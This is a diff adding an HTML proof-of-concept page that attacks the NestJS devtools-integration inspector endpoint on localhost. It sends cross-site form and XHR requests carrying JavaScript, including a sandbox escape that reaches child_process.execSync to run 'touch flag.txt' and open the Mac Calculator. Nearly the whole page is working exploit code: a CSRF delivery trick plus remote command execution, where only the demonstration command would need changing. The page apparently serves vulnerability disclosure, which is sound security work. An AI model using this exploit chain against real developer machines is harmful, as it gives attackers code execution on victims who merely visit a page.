@@ -1,0 +1,96 @@
+<html>
+  <head>
+    <style>
+      code {
+        display: block;
+        white-space: pre;
+        background-color: #f4f4f4;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        padding: 10px;
+        margin: 10px 0;
+        font-family: 'Courier New', monospace;
+        overflow-x: auto;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>NestJS Inspector Payload</h1>
+    <p>These payloads will run if the @nestjs/devtools-integration is installed and running.</p>
+
+    <h2>Simple console.log payload</h2>
+    <p>This will log "hello" to the console. This does not require bypassing the sandbox.</p>
+
+    <form action="http://localhost:8000/inspector/graph/interact" method="POST" enctype="text/plain">
+        <input name="{&quot;code&quot;: &quot;console.log(\&quot;hello\&quot;)&quot;, &quot;bogus&quot;:&quot;" value="&quot;}" />
+        <input type="submit" value="Submit via form POST" />
+    </form>
+        
+    <button onclick="sendConsoleLogXHR()">Send console.log XHR Request</button>
+    <script>
+        function sendConsoleLogXHR() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "http://localhost:8000/inspector/graph/interact");
+            xhr.withCredentials = false;
+            xhr.setRequestHeader("Content-Type", "text/plain");
+            xhr.send('{"code":"console.log(\\"hello\\")"}');
+        }
+    </script>
+
+    <h2>Touch file</h2>
+    <p>This will execute the <i>touch</i> command in the project's root directory. This payload requires bypassing the sandbox.</p>
+    <p>This is the payload being executed:</p>
+    <code>
+        (function() { 
+        try{ 
+            propertyIsEnumerable.call();
+        } catch(pp){
+            pp.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch flag.txt');
+        }
+        })()
+    </code>
+    <form action="http://localhost:8000/inspector/graph/interact" method="POST" enctype="text/plain">
+        <input name="{&quot;code&quot;: &quot;(function() { try{ propertyIsEnumerable.call(); } catch(pp){ pp.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch flag.txt'); } })()&quot;, &quot;bogus&quot;:&quot;" value="&quot;}" />
+        <input type="submit" value="Submit via form POST" />
+    </form>
+    <button onclick="sendTouchFileXHR()">Send touch file XHR Request</button>
+    <script>
+        function sendTouchFileXHR() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "http://localhost:8000/inspector/graph/interact");
+            xhr.withCredentials = false;
+            xhr.setRequestHeader("Content-Type", "text/plain");
+            xhr.send('{"code":"(function() { try{ propertyIsEnumerable.call(); } catch(pp){ pp.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').execSync(\'touch flag.txt\'); } })()"}');
+        }
+    </script>
+
+    <h2>Pop Calculator (Mac only)</h2>
+    <p>This will open the calculator app on a Mac.</p>
+    <p>This payload requires bypassing the sandbox.</p>
+    <p>This is the payload being executed:</p>
+    <code>
+        (function() { 
+            try{ 
+                propertyIsEnumerable.call();
+            } catch(pp){
+                pp.constructor.constructor('return process')().mainModule.require('child_process').execSync('open /System/Applications/Calculator.app');
+            }
+        })()
+    </code>
+    <form action="http://localhost:8000/inspector/graph/interact" method="POST" enctype="text/plain">
+        <input name="{&quot;code&quot;: &quot;(function() { try{ propertyIsEnumerable.call(); } catch(pp){ pp.constructor.constructor('return process')().mainModule.require('child_process').execSync('open /System/Applications/Calculator.app'); } })()&quot;, &quot;bogus&quot;:&quot;" value="&quot;}" />
+        <input type="submit" value="Submit via form POST" />
+    </form>
+    <button onclick="sendPopCalculatorXHR()">Send pop calculator XHR Request</button>
+    <script>
+        function sendPopCalculatorXHR() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "http://localhost:8000/inspector/graph/interact");
+            xhr.withCredentials = false;
+            xhr.setRequestHeader("Content-Type", "text/plain");
+            xhr.send('{"code":"(function() { try{ propertyIsEnumerable.call(); } catch(pp){ pp.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').execSync(\'open /System/Applications/Calculator.app\'); } })()"}');
+        }
+    </script>
+
+  </body>
+</html>
